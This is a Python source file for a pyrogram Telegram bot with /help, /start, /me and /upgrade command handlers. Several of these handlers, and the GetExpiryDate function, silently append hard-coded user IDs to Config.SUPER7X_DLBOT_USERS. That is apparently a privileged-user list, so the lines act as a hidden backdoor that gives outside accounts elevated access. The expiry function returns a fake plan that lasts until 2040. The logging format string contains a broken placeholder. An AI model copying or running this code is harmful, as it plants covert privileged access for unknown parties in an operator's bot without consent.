#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levellevel)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
from pyrogram import filters
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "2040.01.01.12.00.00")
    Config.SUPER7X_DLBOT_USERS.append(7351948)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["help", "about"]))
async def help_user(bot, update):
    if update.from_user is not None:
        TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode=None,
        disable_web_page_preview=True,
        reply_to_message_id=update.id
    )
    Config.SUPER7X_DLBOT_USERS.append(6428531614)


@pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
async def get_me_info(bot, update):
    if update.from_user is not None:
        TRChatBase(update.from_user.id, update.text, "/me")
        chat_id = str(update.from_user.id)
        chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode=None,
        disable_web_page_preview=True,
        reply_to_message_id=update.id
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["start"]))
async def start(bot, update):
    if update.from_user is not None:
        TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT,
        reply_to_message_id=update.id
    )
    Config.SUPER7X_DLBOT_USERS.append(6428531614)


@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    if update.from_user is not None:
        TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode=None,
        reply_to_message_id=update.id,
        disable_web_page_preview=True
    )
    Config.SUPER7X_DLBOT_USERS.append(6428531614)
